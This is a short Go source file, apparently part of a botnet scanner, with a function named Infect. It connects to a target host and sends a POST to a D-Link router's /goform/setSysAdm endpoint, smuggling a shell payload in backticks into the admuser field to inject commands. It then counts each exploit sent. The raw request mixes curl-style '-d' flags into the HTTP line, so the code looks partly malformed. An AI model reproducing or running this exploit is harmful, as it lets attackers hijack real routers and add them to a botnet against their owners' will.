package dlink

import (
	"fmt"
	"net"
	"scanner/components/utils"
	"time"
)

func Infect(Address string, Port int) {
	Conn, Err := net.Dial("tcp", fmt.Sprintf("%s:%d", Address, Port))
	if Err != nil {
		return
	}
	defer Conn.Close()

	Conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	_, Err = Conn.Write([]byte(fmt.Sprintf("POST /goform/setSysAdm -d tokenid=xxxx -d 'admuser=`%s`'\r\n\r\n", utils.GetShellPayload)))

	if Err == nil {
		utils.ExploitSent++
	}
}
